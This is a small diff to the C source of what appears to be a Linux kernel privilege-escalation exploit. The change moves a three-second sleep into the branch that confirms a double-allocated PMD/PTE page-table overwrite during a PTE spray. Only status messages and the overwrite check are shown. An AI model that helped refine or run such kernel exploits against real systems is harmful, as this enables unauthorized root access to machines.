@@ -359,12 +359,13 @@ static void privesc_flh_bypass_no_time(int shell_stdin_fd, int shell_stdout_fd)
 		if (*test_target_addr != 0x41)
 		{
 			printf("[+] confirmed double alloc PMD/PTE\n");
+			sleep(3);
 			PRINTF_VERBOSE("    - PTE area index: %lld\n", i);
 			PRINTF_VERBOSE("    - PTE area (write target address/page): %016llx (new)\n", *test_target_addr);
 			pte_area = test_target_addr;
 		}
 	}
-	sleep(3);
+
 	if (pte_area == NULL)
 	{
 		printf("[-] failed to detect overwritten pte: is more PTE spray needed? pmd: %016llx\n", *(unsigned long long*)_pmd_area);
